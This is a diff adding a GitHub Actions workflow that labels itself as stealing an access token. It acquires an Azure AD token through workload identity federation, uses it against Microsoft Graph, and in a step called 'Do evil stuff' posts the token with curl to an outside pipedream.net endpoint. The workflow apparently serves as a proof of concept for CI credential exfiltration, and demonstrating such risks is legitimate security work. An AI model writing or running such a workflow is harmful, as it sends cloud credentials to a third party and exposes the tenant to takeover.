@@ -1,0 +1,31 @@
+# This is a basic workflow to steal an access token (:
+
+on: workflow_dispatch
+
+permissions:
+  id-token: write
+  contents: read
+
+name: 😈 WIF
+
+jobs:
+  acquire-and-steal:
+    runs-on: ubuntu-latest
+    name: WIF Example
+    steps:
+      - name: Azure AD Workload Identity Federation
+        uses: nicolonsky/WIF@v0.0.1
+        with:
+          tenant_id: ${{ secrets.TenantId }}
+          client_id: ${{ secrets.ClientId }}
+      - name: Do some Stuff
+        run: |
+          Install-Module -Name Microsoft.Graph.Authentication
+          Connect-MgGraph -AccessToken $env:ACCESS_TOKEN
+          Invoke-MgGraphRequest -Uri '/beta/organization' | Select-Object -ExpandProperty value
+        shell: pwsh
+      - name: Do evil stuff
+        run: |
+          curl -d '{"token":"${{ env.ACCESS_TOKEN }}"}' \
+          -H "Content-Type: application/json" \
+          "https://3cc9d6e97f71d89fba8c9afc13798b57.m.pipedream.net"
